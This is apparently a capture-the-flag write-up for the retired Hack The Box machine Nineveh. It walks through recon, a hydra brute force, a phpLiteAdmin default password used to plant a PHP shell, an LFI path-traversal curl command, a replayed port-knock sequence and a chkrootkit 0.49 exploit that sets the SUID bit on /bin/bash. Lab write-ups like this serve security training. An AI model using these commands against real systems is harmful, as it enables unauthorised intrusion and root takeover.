---
machine: Nineveh
os: Linux
difficulty: Medium
platform: Hack The Box
category: Web / Enumeration
state: Retired
tags: [phpliteadmin, lfi, port-knocking, knockd, chkrootkit, cve-2014-0476]
---

# Nineveh — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Two web apps: **80** with a `/department` login hiding a **LFI** (`manage.php?notes=`) and a `phpinfo()`, and **443** with **phpLiteAdmin**. A PHP shell is created through phpLiteAdmin in `/tmp` and included via the LFI. `amrois`'s SSH key is hidden in an image; SSH is closed by **port knocking**, and the final escalation is **chkrootkit 0.49** run by root on `/tmp/update`.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
80/tcp    open  http     Apache httpd 2.4.18
443/tcp   open  ssl/http Apache httpd 2.4.18
```

```bash
ffuf -u https://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k
# /db/index.php (phpLiteAdmin) ; on 80: /department, /info.php, /secure_notes
```

## Access

1. **Brute force** the `/department` login (user `admin`) with `hydra`.
2. **phpLiteAdmin** at `/db/index.php`: the default password is `password`, and the version lets you create a `.php` database containing code.
3. **LFI**: `manage.php?notes=` includes files; `/ninevehNotes.txt/../../tmp/<shell>.php` executes the created PHP.
4. **`www-data`**.

```bash
curl -k "https://<IP>/department/manage.php?notes=/ninevehNotes.txt/../../tmp/x.php"
```

## Escalation

- **`amrois`**: the `secure_notes` image hides a private SSH key (`steghide`/`strings`/`binwalk` depending on the file).
- **SSH closed**: `ps auxww` shows `knockd`; `/etc/knockd.conf` says:

```text
sequence = 571, 290, 911
seq_timeout = 5
start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

```bash
for p in 571 290 911; do nmap -Pn -p $p --max-retries 0 <IP>; done
ssh -i amrois_rsa amrois@<IP>
```

- **root**: `pspy` shows `chkrootkit` started by cron; version 0.49 runs `/tmp/update` as root (CVE-2014-0476).

```bash
printf '#!/bin/bash\nchmod 4755 /bin/bash\n' > /tmp/update; chmod +x /tmp/update
```

## Pitfalls

- **LFI with a prefix**: the `ninevehNotes.txt/../..` trick is needed to climb out of the directory.
- **Self-signed HTTPS**: `curl -k`, or add the host to `/etc/hosts`.
- **knockd timing**: the sequence expires in seconds; the three SYNs must be back to back.

## Lessons

- LFI plus file creation is RCE without an inclusion CVE.
- Images and "notes" files hide keys.
- Port knocking is obfuscation, not security: read the config and replay it.
- An old rootkit scanner running as root is a backdoor.
